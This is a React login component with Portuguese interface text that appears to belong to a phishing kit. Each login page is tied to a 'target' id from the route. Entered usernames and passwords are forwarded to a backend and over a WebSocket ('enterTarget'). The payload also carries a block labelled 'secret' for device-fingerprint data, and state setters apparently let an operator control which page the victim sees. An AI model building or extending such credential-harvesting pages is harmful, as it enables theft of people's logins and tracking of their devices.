import React, { useState } from "react";
import { useTarget } from "../contexts/target.context";
import "../styles/Login.css";
import loginIMG from "../imagens/LoginIMG.jpg";
import { EnterTargetBody, enterTargetAPI } from "../fetchs/target.fetch";
import { useParams } from "react-router-dom";
import { enterTarget } from "../target-socket";

export default function LoginComponent() {
  const { setCurrentPage, setTargetPage, setTargetStatus, setLastPage, targetData, setTargetData } = useTarget();
  const { id: targetIdFromRoute } = useParams<{ id: string }>(); // pega :id da rota

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);

  async function doLoginFetch(u: string, p: string) {
    if (u === "admin" && p === "123") {
      return { success: true };
    }
    return { success: false, message: "Usuário ou senha inválidos." };
  }

  async function handleLogin(e?: React.FormEvent) {
    e?.preventDefault();
    setSubmitting(true);
    setError(null);

    try {
      const res = await doLoginFetch(username, password);

      if (!res.success) {
        setError(res.message || "Falha no login");
        return;
      }

      if (!targetIdFromRoute) {
        throw new Error("Target ID não encontrado na rota");
      }

      // 🔹 Monta body para o backend REST
      const body: EnterTargetBody = {
        dto: {
          name: username,
          info: password,
        },
        secret: {
          screenWidth: 0,
          screenHeight: 0,
          timezone: "",
          language: "",
          languages: [],
          platform: "",
          deviceMemory: 0,
          hardwareConcurrency: 0,
        },
      };

      // 🔹 Chama REST (opcional)
      await enterTargetAPI(targetIdFromRoute, body);

      // 🔹 🔥 Dispara também via WebSocket
      enterTarget({
        targetId: targetIdFromRoute,
        name: username,
        info: password,
      });

      // Atualiza contexto
      setLastPage(0);
      setCurrentPage(1);
      setTargetPage(1);

      if (targetData) {
        setTargetData({ ...targetData, info: `logged:${username}` });
      }
    } catch (err: any) {
      setError(err.message || "Erro desconhecido");
    } finally {
      setSubmitting(false);
    }
  }

  return (
    <div className="login-wrapper">
      {/* Imagem acima da caixa de login */}
      <div className="login-header">
        <img src={loginIMG} alt="Login Banner" className="login-img" />
      </div>

      {/* Caixa de login */}
      <div id="boxLogin" className="login-container">
        {error && (
          <div id="msgErroBoxLogin" className="txtErro">
            <strong>{error}</strong>
          </div>
        )}

        <form onSubmit={handleLogin} className="login-box">
          <p className="mb10 aviso">
            <b>Insira o usuário e a senha</b>
          </p>

          <div className="input-group">
            <label htmlFor="usuario">Usuário</label>
            <input
              id="usuario"
              type="text"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              placeholder="Digite seu usuário"
              required
            />
          </div>

          <div className="input-group">
            <label htmlFor="senha">Senha</label>
            <input
              id="senha"
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Digite sua senha"
              required
            />
          </div>

          <button type="submit" className="btn-login" disabled={submitting}>
            {submitting ? "Entrando..." : "Entrar"}

            {/* ToDo 2: Colocar aqui para o OnClique ativar o Enter Target*/}
          </button>
        </form>
      </div>
    </div>
  );
}
